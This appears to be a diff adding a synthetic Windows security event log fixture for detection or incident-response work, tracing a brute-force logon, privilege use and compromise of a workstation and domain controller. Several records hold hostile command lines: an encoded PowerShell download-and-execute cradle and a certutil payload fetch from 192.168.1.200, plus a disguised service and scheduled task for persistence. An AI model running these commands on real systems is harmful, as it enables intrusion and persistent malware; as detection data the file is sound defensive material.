@@ -1,0 +1,131 @@
+[
+  {
+    "EventID": "4625",
+    "TimeCreated": "2024-03-15T08:01:11.000Z",
+    "Computer": "WORKSTATION-42",
+    "AccountName": "jsmith",
+    "IpAddress": "10.10.50.201",
+    "LogonType": "3",
+    "Channel": "Security"
+  },
+  {
+    "EventID": "4625",
+    "TimeCreated": "2024-03-15T08:01:23.000Z",
+    "Computer": "WORKSTATION-42",
+    "AccountName": "jsmith",
+    "IpAddress": "10.10.50.201",
+    "LogonType": "3",
+    "Channel": "Security"
+  },
+  {
+    "EventID": "4625",
+    "TimeCreated": "2024-03-15T08:01:35.000Z",
+    "Computer": "WORKSTATION-42",
+    "AccountName": "jsmith",
+    "IpAddress": "10.10.50.201",
+    "LogonType": "3",
+    "Channel": "Security"
+  },
+  {
+    "EventID": "4625",
+    "TimeCreated": "2024-03-15T08:01:47.000Z",
+    "Computer": "WORKSTATION-42",
+    "AccountName": "jsmith",
+    "IpAddress": "10.10.50.201",
+    "LogonType": "3",
+    "Channel": "Security"
+  },
+  {
+    "EventID": "4625",
+    "TimeCreated": "2024-03-15T08:01:59.000Z",
+    "Computer": "WORKSTATION-42",
+    "AccountName": "jsmith",
+    "IpAddress": "10.10.50.201",
+    "LogonType": "3",
+    "Channel": "Security"
+  },
+  {
+    "EventID": "4624",
+    "TimeCreated": "2024-03-15T08:02:15.000Z",
+    "Computer": "WORKSTATION-42",
+    "AccountName": "jsmith",
+    "IpAddress": "10.10.50.201",
+    "LogonType": "3",
+    "Channel": "Security"
+  },
+  {
+    "EventID": "4672",
+    "TimeCreated": "2024-03-15T08:02:16.000Z",
+    "Computer": "WORKSTATION-42",
+    "AccountName": "jsmith",
+    "Channel": "Security"
+  },
+  {
+    "EventID": "4688",
+    "TimeCreated": "2024-03-15T08:03:01.000Z",
+    "Computer": "WORKSTATION-42",
+    "AccountName": "jsmith",
+    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
+    "ParentProcessName": "C:\\Windows\\Explorer.EXE",
+    "CommandLine": "cmd.exe /c powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyADAAMAAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+    "Channel": "Security"
+  },
+  {
+    "EventID": "4688",
+    "TimeCreated": "2024-03-15T08:03:02.000Z",
+    "Computer": "WORKSTATION-42",
+    "AccountName": "jsmith",
+    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyADAAMAAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+    "Channel": "Security"
+  },
+  {
+    "EventID": "7045",
+    "TimeCreated": "2024-03-15T08:04:30.000Z",
+    "Computer": "WORKSTATION-42",
+    "ServiceName": "WindowsUpdateHelper",
+    "ServiceFileName": "C:\\ProgramData\\update\\svchost32.exe",
+    "ServiceType": "Own Process",
+    "StartType": "Auto",
+    "Channel": "System"
+  },
+  {
+    "EventID": "4698",
+    "TimeCreated": "2024-03-15T08:05:00.000Z",
+    "Computer": "WORKSTATION-42",
+    "AccountName": "jsmith",
+    "TaskName": "\\Microsoft\\Windows\\Update\\BackgroundCheck",
+    "TaskPath": "C:\\ProgramData\\update\\svchost32.exe",
+    "Channel": "Security"
+  },
+  {
+    "EventID": "4624",
+    "TimeCreated": "2024-03-15T09:00:00.000Z",
+    "Computer": "DC-01",
+    "AccountName": "Administrator",
+    "IpAddress": "10.10.50.201",
+    "LogonType": "3",
+    "Channel": "Security"
+  },
+  {
+    "EventID": "4688",
+    "TimeCreated": "2024-03-15T09:01:00.000Z",
+    "Computer": "DC-01",
+    "AccountName": "Administrator",
+    "NewProcessName": "C:\\Windows\\System32\\certutil.exe",
+    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "certutil.exe -urlcache -split -f http://192.168.1.200/payload C:\\ProgramData\\update\\payload.exe",
+    "Channel": "Security"
+  },
+  {
+    "EventID": "4688",
+    "TimeCreated": "2024-03-15T09:02:00.000Z",
+    "Computer": "DC-01",
+    "AccountName": "Administrator",
+    "NewProcessName": "C:\\Windows\\System32\\net.exe",
+    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "net localgroup administrators",
+    "Channel": "Security"
+  }
+]
